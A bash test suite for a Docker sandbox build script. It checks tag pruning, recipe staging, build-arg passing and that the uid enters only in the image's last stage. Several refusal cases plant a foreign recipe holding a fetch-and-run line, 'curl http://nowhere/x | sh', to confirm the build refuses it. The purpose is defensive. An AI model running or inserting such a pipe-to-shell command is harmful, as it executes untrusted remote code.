#!/usr/bin/env bash
# Tests for host/sandbox/build.sh: the old date tags it removes after a build,
# the recipe it stages for the build, and that what the Dockerfile reads comes
# from versions.env. A stub docker
# keeps the image's tags in $T/images, "<tag> <id>" per line, as
# `docker image ls` lists them, and the containers in $T/containers,
# "<container id> <image id>" per line.
# shellcheck disable=SC2016  # stub bodies are expanded when the stub runs
# shellcheck source=test/lib.sh
. "$(dirname "$0")/lib.sh" || exit 1

build="$T_ROOT/host/sandbox/build.sh"
dockerfile=$T_ROOT/host/sandbox/Dockerfile
# The copy of the recipe the build is made of, which build.sh makes beside the
# recipe just before it asks for the build and takes back when it ends. It is not
# in the checkout - its words come out of the recipe - so the cases that ask
# something of it make it the way the build does, in the same order and from the
# same two reads of the file, rather than trusting a copy a run left behind. Like
# the build, they make it under another name and rename it into place, because the
# name is the thing build.sh refuses to write through.
uid_recipe=$T/sandbox-uid.Dockerfile
stage_uid_recipe() {
  tmp=$(mktemp "$uid_recipe.XXXXXX") || return 1
  {
    sed -n '1,/^FROM shared$/p' "$dockerfile" | sed '/^FROM shared$/d;/^ARG TEHAS_UID=/d'
    sed -n '/^FROM shared$/,$p' "$dockerfile"
  } >"$tmp" || { rm -f "$tmp"; return 1; }
  mv -f "$tmp" "$uid_recipe"
}
uid=$(id -u)
# pi-rukas's newest release tag, so the build asks no network.
t_stub git 'printf "%s\trefs/tags/v0.12.80\n" aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
t_stub docker 'case "$1" in
  build)
    # The recipe the build was handed, kept while the run stands: build.sh takes
    # its own copy back when it ends, so this is the only reading of it. The -f
    # name and its value come in pairs, and the pair is what is asked. The mode of
    # the file at that moment goes with it, in case the build served that name
    # from somewhere else: a name someone else made is not a name to write into.
    prev=""
    for a in "$@"; do
      if [ "$prev" = -f ] && [ -f "$a" ]; then
        cp "$a" "$T/docker-build-recipe"
        stat --format=%a "$a" >"$T/docker-build-mode" 2>/dev/null || echo none >"$T/docker-build-mode"
      fi
      prev=$a
    done
    while [ "$#" -gt 0 ]; do [ "$1" = -t ] && echo "${2#*:} sha256:new" >>"$T/images"; shift; done ;;
  tag) echo "${3#*:} sha256:new" >>"$T/images" ;;
  ps) [ -z "${PS_RC:-}" ] || exit "$PS_RC"; cut -d" " -f1 "$T/containers" ;;
  inspect) shift 3; for c in "$@"; do awk -v c="$c" "\$1 == c { print \$2 }" "$T/containers"; done ;;
  image) awk "!seen[\$1]++" "$T/images" ;;
  rmi) [ "$2" != "${RMI_FAILS:-}" ] || exit 1 ;;
  run) cat "$T_ROOT/test/fixtures/headless-c5ddc0a/capabilities.json" ;;
esac'
# Six builds before this one, the oldest first, each its own image. The last
# also carried the uid tag, which the build moves to the new image.
setup() {
  : >"$T/containers"
  printf '%s\n' "uid$uid sha256:new" "uid$uid sha256:6" "261009-1000 sha256:1" "261010-1000 sha256:2" \
    "261011-1000 sha256:3" "261012-1000 sha256:4" "261013-1000 sha256:5" "261014-1000 sha256:6" >"$T/images"
  rm -f "$T"/calls/* "$T/docker-build-recipe" "$T"/home/tehas/sandbox/sandbox-uid.Dockerfile*
}
removed() { t_calls docker | awk '$1 == "rmi" { print $2 }' | LC_ALL=C sort | tr '\n' ' '; }

t_case "after a build the newest three date tags stay and older ones are removed"
setup
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261009-1000 tehas/pi-rukas:261010-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "
t_contains "$t_out" "removed tehas/pi-rukas:261009-1000"
t_lacks "$(t_calls docker)" "rmi tehas/pi-rukas:uid"

t_case "a tag whose image a container was made from is kept"
setup
printf '%s\n' "c1 sha256:2" "c2 sha256:new" >"$T/containers"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261009-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "
t_contains "$t_out" "kept tehas/pi-rukas:261010-1000: a container or a uid tag uses it"

t_case "a tag whose image another uid tag names is kept"
setup
echo "uid4242 sha256:1" >>"$T/images"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261010-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "

t_case "a tag that cannot be removed is said, and the build still counts"
setup
T_ENV=(RMI_FAILS=tehas/pi-rukas:261010-1000)
t_run "$build"
t_eq "$t_rc" 0
t_contains "$t_out" "warning: could not remove tehas/pi-rukas:261010-1000"
t_contains "$t_out" "removed tehas/pi-rukas:261009-1000"
T_ENV=()

t_case "a docker that does not list its containers removes nothing"
setup
T_ENV=(PS_RC=1)
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" ""
t_contains "$t_out" "no old tehas/pi-rukas tag was removed"
T_ENV=()

t_case "three builds or fewer remove nothing"
setup
printf '%s\n' "uid$uid sha256:2" "261010-1000 sha256:1" "261011-1000 sha256:2" >"$T/images"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" ""

# Only one file of the image is tracked. The copy the build is made of is written
# from it just before docker is asked and taken back when the run ends, so the two
# cannot drift, nothing stands between builds, and a build handed the tracked file
# alone - which would stop at the boundary with no user remapped and no tool gate
# - is caught by what it names in its own call. The uid it passes comes from the
# machine and from no file of the repository.
t_case "the build stages the image from the Dockerfile and builds that"
setup
# The toolchain as a host holds it, which is where the build reads the recipe
# beside itself: the file, the lib it sources, and the pins it reads.
home=$T/home/tehas/sandbox
mkdir -p "$home" "$T/home/tehas/lib"
cp "$build" "$dockerfile" "$home/"
cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
  "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$T/home/tehas/lib/"
cp "$T_ROOT/host/versions.env" "$T/home/tehas/"
t_run "\"$home/build.sh\" >/dev/null || exit 1
! test -e \"$home/sandbox-uid.Dockerfile\" || echo left behind
! test -e \"$home/sandbox-uid.Dockerfile\".XXXXXX || echo staged file left behind"
t_eq "$t_rc" 0
t_eq "$t_out" ""
# The file the run made is asked of the stub while the build is still standing,
# so a copy an earlier run left behind cannot answer for it: the copy is made,
# used and taken away by the same run, and what docker was handed is the whole
# image - both stages, with every step the tracked recipe holds.
stage_uid_recipe
t_eq "$(cat "$T/docker-build-recipe")" "$(cat "$uid_recipe")"
# The copy is made under a name of its own and renamed onto the one docker is
# given, so the build never has that name open: whatever stood under it is gone by
# the time docker reads it, and the file it reads is the one this run wrote, which
# is owner-only because no one else is meant to read the image's steps out of it.
# The mode and the contents are asked of the stub while the build stands, so a copy
# an earlier run left behind answers for neither.
t_eq "$(cat "$T/docker-build-mode")" 600
build_call=$(t_calls docker | grep -m 1 '^build ')
# One file names both stages, so a build that was given only the tracked one -
# whose second stage has no base of its own to take - is a build that says so
# here, and no argument is passed that the staged file does not declare.
t_eq "$(grep -c -- '-f ' <<<"$build_call")" 1
t_contains "$build_call" "-f $home/sandbox-uid.Dockerfile"
t_lacks "$build_call" "-f $home/Dockerfile"
t_contains "$build_call" "--build-arg TEHAS_UID=$uid"
# The stage below the boundary is the one the tracked file ends at: its FROM, the
# remap, and the read of the model that has to see the id the remap gave. The
# build copies those lines from the tracked file and removes its own copy when it
# ends, so they are asked of the file the repository holds.
stage=$(sed -n '/^FROM shared$/,$p' "$dockerfile")
t_contains "$stage" 'usermod -u "$TEHAS_UID"'

t_case "the staged image holds every step the tracked file has and no argument twice"
setup
# The copy the build is made of, staged by hand the way the build stages it: the
# whole image, the shared stage as the file writes it and the stage below the
# boundary, with each argument declared where the step that reads it stands.
stage_uid_recipe
# Every RUN, COPY and ADD of the tracked file is in the staged image, and the
# staged image holds no step the file does not: a staging that lost a step would
# build an image with something missing from it, and one that added a step would
# build one with something no one reviews.
tracked=$(awk '{ line = $0
  while (sub(/[ \t]*\\[ \t]*$/, "", line)) { if ((getline nxt) <= 0) break; line = line " " nxt }
  if (line !~ /^[ \t]*(RUN|COPY|ADD)([ \t]|$)/) next
  sub(/^[ \t]*/, "", line)
  print line
}' "$dockerfile" | LC_ALL=C sort)
staged=$(awk '{ line = $0
  while (sub(/[ \t]*\\[ \t]*$/, "", line)) { if ((getline nxt) <= 0) break; line = line " " nxt }
  if (line !~ /^[ \t]*(RUN|COPY|ADD)([ \t]|$)/) next
  sub(/^[ \t]*/, "", line)
  print line
}' "$uid_recipe" | LC_ALL=C sort)
t_eq "$staged" "$tracked"
# One ARG line for the uid, and it stands below the boundary: an argument is read
# from the line that declares it, so a second one above would let the remap see
# the empty value of the stage that holds it.
t_eq "$(grep -c '^ARG TEHAS_UID' "$dockerfile")" 1
t_contains "$(sed -n '/^FROM shared$/,$p' "$dockerfile")" 'ARG TEHAS_UID'

t_case "a build whose staged recipe would be the tracked one refuses and asks nothing"
setup
# The cleanup that takes the staged recipe off the disk runs whatever the build
# did after it, so the name it holds is checked before anything is written: a run
# that staged into the tracked file would remove the file it builds the image
# from. The build says so and asks docker nothing, and the recipe is where it was.
home=$T/home/tehas/sandbox
mkdir -p "$home" "$T/home/tehas/lib"
sed 's|^uid_recipe=\$here/sandbox-uid.Dockerfile$|uid_recipe=$here/Dockerfile|' "$build" >"$home/build.sh"
cp "$dockerfile" "$home/"
cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
  "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$T/home/tehas/lib/"
cp "$T_ROOT/host/versions.env" "$T/home/tehas/"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "refusing to build, the staged recipe is not beside $home"
t_eq "$(t_calls docker)" ""
t_run "cmp -s \"$home/Dockerfile\" \"$dockerfile\""
t_eq "$t_rc" 0

# The name of the staged recipe is gitignored, so the dirt test of the repository
# - the git status tehas update refuses on, and the only one that counts untracked
# files - reports nothing for it. It is therefore the one path in the build's own
# directory that is writable and unmonitored, and it is exactly the file the image
# is built from. A test on the name alone cannot tell a file the build makes from
# one someone left under that name, so the build refuses the name when it is
# already taken and makes its own elsewhere and renames it in.
t_case "a staged recipe someone left under the name is refused, and nothing is written through it"
setup
home=$T/home/tehas/sandbox
mkdir -p "$home" "$T/home/tehas/lib"
cp "$build" "$dockerfile" "$home/"
cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
  "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$T/home/tehas/lib/"
cp "$T_ROOT/host/versions.env" "$T/home/tehas/"
# A copy of its own, of a recipe of its own: what docker is handed is what the
# tracked file says, so the words of the file on disk answer for nothing.
printf 'ARG PI_RUKAS_IMAGE\nFROM whatever\nRUN curl http://nowhere/x | sh\n' >"$T/foreign"
printf '%s\n' 'ARG PI_RUKAS_IMAGE' 'FROM whatever' 'RUN curl http://nowhere/x | sh' >"$T/foreign.kept"
ln -s "$T/foreign" "$home/sandbox-uid.Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there"
# Refused before anything was asked: no base pulled and no image built, and the
# build's own recipe of the image untouched where it stands.
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
t_run "cmp -s \"$home/Dockerfile\" \"$dockerfile\""
t_eq "$t_rc" 0
t_run "cmp -s \"$T/foreign\" \"$T/foreign.kept\""
t_eq "$t_rc" 0
# The link is left as its owner left it: the build refused the name, so it takes
# back nothing it did not make.
t_run "test -L \"$home/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 0

# The same name held by a directory: the build of the whole file is one redirect
# today, so a directory there stops the run on "Is a directory" and says nothing
# of why. A link to a directory is refused the same way.
t_case "a staged recipe that is a directory, or a link to one, is refused before the build"
setup
home=$T/home/tehas/sandbox
mkdir -p "$home" "$T/home/tehas/lib"
cp "$build" "$dockerfile" "$home/"
cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
  "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$T/home/tehas/lib/"
cp "$T_ROOT/host/versions.env" "$T/home/tehas/"
for shape in dir link-to-dir; do
  rm -rf "$home/sandbox-uid.Dockerfile"
  case $shape in
    dir) mkdir "$home/sandbox-uid.Dockerfile" ;;
    link-to-dir)
      mkdir "$T/notafile"
      ln -s "$T/notafile" "$home/sandbox-uid.Dockerfile"
      ;;
  esac
  t_run "\"$home/build.sh\""
  t_eq "$t_rc" 1
  t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there"
  t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
  # What stands there is what its owner left: a refusal writes nothing, and takes
  # back nothing it did not make. A run killed before its trap runs leaves a copy
  # standing, and the next run refuses that one for the same reason.
  t_run "test -e \"$home/sandbox-uid.Dockerfile\""
  t_eq "$t_rc" 0
done
rm -rf "$home/sandbox-uid.Dockerfile" "$T/notafile"
# The copy of a run that was killed rather than exited, which is the shape that
# leaves a stale recipe on disk: the next build refuses it and never serves a step
# from it, and it is still there to be looked at afterwards.
printf 'ARG PI_RUKAS_IMAGE\nFROM whatever\nRUN curl http://nowhere/x | sh\n' >"$home/sandbox-uid.Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there"
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
t_run "test -s \"$home/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 0

t_case "every argument the image reads is passed from versions.env"
while read -r arg; do
  case $arg in PI_RUKAS_IMAGE | PI_RUKAS_COMMIT | TEHAS_UID | TEHAS_RUKAS_IMAGES) continue ;; esac
  grep -q "^$arg=" "$T_ROOT/host/versions.env" || t_bad "$arg is not in versions.env"
  grep -qF -- "--build-arg $arg=\"\$$arg\"" "$build" || t_bad "build.sh does not pass $arg"
done < <(sed -n 's/^ARG \([A-Z0-9_]*\).*/\1/p' "$dockerfile")
# One --build-arg for each ARG line the staged image declares. It repeats the
# recipe's lines for the steps above the boundary and carries the uid's below it,
# where the remap reads it, so the count is asked of that file and not of the
# recipe alone: an ARG line added below the boundary, of a name no --build-arg
# answers for, would go unnoticed by the recipe.
stage_uid_recipe
args=$(sed -n 's/^ARG \([A-Z0-9_]*\).*/\1/p' "$uid_recipe" | LC_ALL=C sort -u)
t_eq "$args" "$(grep -oE -- '--build-arg [A-Z0-9_]+' "$build" | sed 's/^--build-arg //' | LC_ALL=C sort)"

# The image is shared between the instance users of a host by its layers: a
# layer built for one uid is a layer every other uid's build reuses, and one
# that reads the uid is rebuilt and stored again for each of them. So the uid
# enters as late as the file allows - later still than one file can, since the
# checks that run as the cycle's user and the answer for the base have to be
# read once the id has moved. host/sandbox/Dockerfile holds the layers the uid
# does not decide and ends at the stage that takes them; the recipe build.sh
# writes from it is the rest. The steps of the recipe are read as the build sees
# them: the continuations joined into the instruction the build runs, and the
# comments, which run no step, left out. What is asked is that the remap is the
# only step of the whole image that reads the uid, and that no step of the layers
# named below reads it. The read is not vacuous: each step named below is asked
# for by its own words, so a Dockerfile that no longer holds one of them fails
# here rather than passing for the want of a match, and a file that lost the
# boundary loses the stage below it and fails with it. The layers named first are
# the ones the issue names: the packages, the code indexer, the downloads and the
# embedding model, and the read of that model; the last is the browsers, the most
# expensive step of the build.
t_case "the sandbox image reads the uid only in its last steps"
# The steps of the recipe, as the build sees them: one entry per instruction it
# runs, the continuations joined into the instruction, and the comments, which run
# no step, left out. The boundary between the shared layers and the uid is read
# from the same pass: a step before it is a layer the instance users of one host
# share, a step from it on belongs to one uid. A file that lost the boundary has
# the steps that should be the last ones read as steps of the shared layers, and
# the boundary read below answers none.
steps=$(awk '{ line = $0
  while (sub(/[ \t]*\\[ \t]*$/, "", line)) {
    if ((getline nxt) <= 0) break
    line = line " " nxt
  }
  if (line !~ /^[ \t]*(FROM|RUN|COPY|ADD)([ \t]|$)/) next
  sub(/^[ \t]*/, "", line)
  if (line == "FROM shared") boundary = n + 1
  step[++n] = line
}
END {
  for (i = 1; i <= n; i++) print i "\t" step[i]
  # The number of the boundary itself, which the steps are counted against.
  print "boundary\t" boundary + 0
}' "$dockerfile")
# step_of <words>: the number of the first step whose words hold these, 0 for none.
# A word that stands only in a comment names no step, since the comments are not
# among the lines below.
step_of() {
  awk -F '\t' -v want="$1" 'index($2, want) { print $1; exit }' <<<"$steps"
}
# The number the steps are counted against, taken from the same read
# so no second parser can disagree with the first.
boundary=$(awk -F '\t' '$1 == "boundary" { print $2; exit }' <<<"$steps")
# The steps that read the uid, and the remap among them.
uid_steps=$(awk -F '\t' '$2 ~ /TEHAS_UID/ { print $1 }' <<<"$steps")
remap=$(step_of 'usermod -u "$TEHAS_UID"')
for name in 'apt-get install' 'codebase-memory-mcp --version' \
  'https://github.com/koalaman/shellcheck' 'https://github.com/jqlang/jq' \
  '/home/vscode/.cache/huggingface' 'vipune search' 'playwright install --with-deps'; do
  share=$(step_of "$name")
  [ "$share" != 0 ] || t_bad "no step of the image holds: $name"
  # A step of these layers that reads the uid is rebuilt for each instance user,
  # which is the whole cost this issue is about. It also tells the count below
  # that the file still holds the steps it names.
  case " $uid_steps " in *" $share "*) t_bad "the step holding $name reads the uid" ;; esac
done
# One step reads the uid, and it is the remap: a second one higher up would split
# the shared layers again. The remap is named here as well as above, so a file
# that lost it cannot pass by holding no step that reads the uid.
t_eq "$uid_steps" "$remap"
model=$(step_of '/home/vscode/.cache/huggingface')
# The remap comes after every layer that must not read the uid, the embedding
# model being the last of them. The steps below the remap are the checks run as
# the cycle's user and the answer for the base, none of which installs anything.
[ -n "$remap" ] || t_bad "the image has no remap step"
t_eq "$([ "$remap" -gt "$model" ] && echo late || echo early)" late
# The boundary the sharing rests on, named in the file the build reads: a stage
# that takes the layers above it, with the remap below it, and no second read of
# the uid above it. Without it the image is one stage, and everything under
# the remap is built again for each instance user.
t_eq "$(grep -c '^FROM shared$' "$dockerfile")" 1
t_contains "$(cat "$uid_recipe")" 'FROM shared'
[ "$boundary" -gt "$model" ] || t_bad "the uid enters above the shared layers"
t_eq "$([ "$remap" -ge "$boundary" ] && echo below || echo above)" below
for name in 'playwright install --with-deps' 'vipune search'; do
  [ "$(step_of "$name")" -ge "$boundary" ] || t_bad "the step holding $name is above the boundary"
done

t_done
